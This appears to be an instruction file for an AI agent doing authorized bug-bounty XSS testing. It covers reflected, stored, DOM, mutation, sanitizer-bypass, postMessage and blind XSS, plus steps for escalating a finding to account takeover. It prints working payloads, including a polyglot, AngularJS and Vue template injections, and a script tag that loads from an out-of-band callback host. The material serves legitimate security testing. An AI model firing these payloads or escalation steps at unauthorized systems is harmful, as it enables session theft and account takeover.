---
name: xss
description: >-
  Hunt XSS of every kind on an AUTHORIZED target — reflected, stored, DOM-based,
  mXSS, DOMPurify/sanitizer bypass, plus postMessage abuse and XS-Leaks. Trigger
  when asked to find XSS or run the xss module. Reflected reflection is
  auto-detected; the rest is agent-guided manual work. Confirm execution in a
  browser before reporting.
---

# xss

XSS = attacker JavaScript running in a victim's session on the target origin.
Impact: session/cookie theft, account takeover, acting as the victim. This skill
covers all variants. The `xss_reflected.py` harness auto-detects *reflection +
context*; everything else is a methodology you (or the agent, with a browser)
follow by hand.

## Hard rules
1. Scope enforced via `scope.txt`. Benign PoC only: `alert(document.domain)` or a
   callback to YOUR host — never steal real users' data.
2. A reflection is NOT XSS. Confirm **execution in a browser** before reporting.
3. Never fire a payload at real users (stored XSS: use your own account/test data).

## The variants and how to find each

### 1. Reflected XSS (auto-detected by `xss_reflected.py`)
Input echoed into the immediate response. The harness injects a marker + breakout
chars (`< > " ' \``) and reports the **context** and which chars survive unencoded:
- **html / tag** context, `<` `>` unencoded → `<svg/onload=alert(document.domain)>`
- **attribute** context, `"`/`'` unencoded → `"><svg/onload=alert(document.domain)>`
- **script** context, quote unencoded → `';alert(document.domain)//`
Confirm each in a browser. Encoded breakout chars = safe = false positive.

### 2. Stored XSS
Payload saved server-side, fires when viewed (profile, comment, filename, support
ticket). Method: submit a unique marker in every writable field, then find where
it renders (same app, admin panel, exported PDF, logs). Test the breakout the same
way. Use only your own account/test data.

### 3. DOM-based XSS (find leads with `js_recon.py`)
Client-side: a **source** (attacker-controlled) flows into a **sink** (executes)
with no server round-trip. `js_recon.py` flags files where a sink and source
co-occur (⚠ in `report_jsrecon.md`).
- Sources: `location.hash/search/href`, `document.URL/referrer/cookie`,
  `window.name`, `postMessage`, `localStorage`.
- Sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`,
  `eval`, `setTimeout(str)`, `Function()`, `location=`, `.html()`, `srcdoc`,
  `dangerouslySetInnerHTML`.
- Confirm: trace the source→sink path in DevTools, then trigger via the URL,
  e.g. `https://target/#<img src=x onerror=alert(document.domain)>`.

### 4. mXSS (mutation XSS)
The browser's HTML parser *mutates* sanitized markup back into something
executable after insertion (often via `innerHTML`). Classic vectors: nesting in
`<noscript>`, `<template>`, `<math>`/`<svg>` foreign-content, malformed
attributes, `<style>` re-parsing. Test when a sanitizer runs then the result is
re-inserted. Payload ideas live in the XSS cheat sheet; e.g. forms that round-trip
through `innerHTML` twice.

### 5. DOMPurify / sanitizer bypass
When the app uses DOMPurify or similar: check the **version** (in the JS), look up
known bypasses for that version, and test config weaknesses — `ALLOWED_TAGS`/
`ADD_TAGS` too loose, `RETURN_DOM`/`SAFE_FOR_TEMPLATES` misuse, or mutation after
purify (mXSS). A sanitizer that runs on output but the app re-parses the result is
the opening.

### 6. postMessage abuse
Find `window.addEventListener("message", ...)` handlers in the JS. Vulnerable if
the handler: (a) does not verify `event.origin`, and (b) passes `event.data` into
a sink (innerHTML, eval, location). PoC: an attacker page that `postMessage`s a
payload to the target in an iframe. `js_recon.py` flags `postMessage` as a
source — grep the handler and check origin validation.

### 7. XS-Leaks (cross-site leaks)
Side-channel inference of cross-origin state (is the user logged in? is X true?)
via timing, frame counting, error events, cache probing. Advanced and often
lower-severity; pursue only when the program values it. Reference xsleaks.dev.

### 8. Blind XSS
Payload fires on a page you can't see (support ticket, admin panel, logs, the
User-Agent header). Can't use `alert` — use an **out-of-band callback** to your
own listener (interactsh, or a labeled script URL). Inject a labeled payload in
every writable field / header so the callback tells you WHICH field fired:
`<script src=https://YOURID.oast.live/username></script>` in the username field,
`.../bio` in bio, etc. A hit on your listener = blind XSS confirmed in that field.
High-value spots: contact forms, reviews, support tickets, profile fields, and the
`User-Agent`/`Referer` headers (admins view these in dashboards).

## Escalation — turn "alert(1)" into Critical
After confirming execution, do IMPACT recon, not more payloads. Ask in order:
1. Can JS read auth state? (`document.cookie` if not HttpOnly, `localStorage`/
   `sessionStorage` tokens, JWT, app state, CSRF token in DOM) → High/Critical.
2. Can JS perform authenticated actions as the user? (change email, add recovery
   email, add OAuth link, generate API key, change password) → High = account takeover.
3. Can the change persist / lock the victim out? → High/Critical.
4. Can it impact OTHER users (stored, or admin views it)? → severity jumps.
5. Can it reach an admin/support/tenant-owner context? → Critical.
Severity ladder: popup → low/med · user-data read → med/high · authed action →
high · account persistence → high/critical · admin/org impact → critical.
Modern apps store auth in localStorage (SPAs) more than cookies, so even with
HttpOnly cookies, "act as the user" via their token or via API calls is the path.
Benign PoC only — demonstrate capability (e.g. read your OWN test token, change
your OWN test account's email); never touch real users.

## Polyglot (one payload, many contexts — good first probe)
```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>
```
Framework contexts: AngularJS `{{constructor.constructor('alert(1)')()}}`,
Vue `{{_openBlock.constructor('alert(1)')()}}`,
React `dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}`.

## Tools
XSStrike (`python xsstrike.py -u "URL?p=x"`) for crawling+fuzzing; the
`xss_reflected.py` harness for context detection; a headless browser (Playwright)
to confirm DOM/stored execution.

## Workflow
1. Run `xss_reflected.py` (or `hunt.py --modules xss`) → reflected leads.
2. Run `js_recon.py` → DOM sink/source leads + sanitizer versions + endpoints.
3. For each lead, confirm **execution** in a browser with a benign payload.
4. For stored/DOM/mXSS/postMessage, work the methodology above by hand.
5. Draft the report only for confirmed execution; include the exact PoC URL/steps
   and a screenshot/recording of the alert.

## Public resources
- PortSwigger XSS cheat sheet — interactive, indexed by context/tag/event, copy-paste vectors: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger research — "One XSS cheatsheet to rule them all": https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
- PortSwigger research — Bypassing DOMPurify again with mutation XSS: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
- aszx87410 — "Beyond XSS" (DOM clobbering, mXSS, prototype-pollution → XSS): https://aszx87410.github.io/beyond-xss/en/
- PayloadsAllTheThings — XSS Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- HackTricks (search "XSS"): https://book.hacktricks.wiki
- DOMPurify source + releases (check the target's version against fixed bypasses): https://github.com/cure53/DOMPurify
- XS-Leaks wiki: https://xsleaks.dev
- Blind XSS — self-hosted XSS Hunter Express: https://github.com/mandatoryprogrammer/xsshunter-express

Keep a curated set; context dictates the payload, not a spray.

## Severity
Reflected/DOM XSS on an authenticated origin → typically high (session theft/ATO).
Self-XSS or XSS needing unrealistic interaction → low/informational. Rate by what
you can actually achieve, and state it honestly.
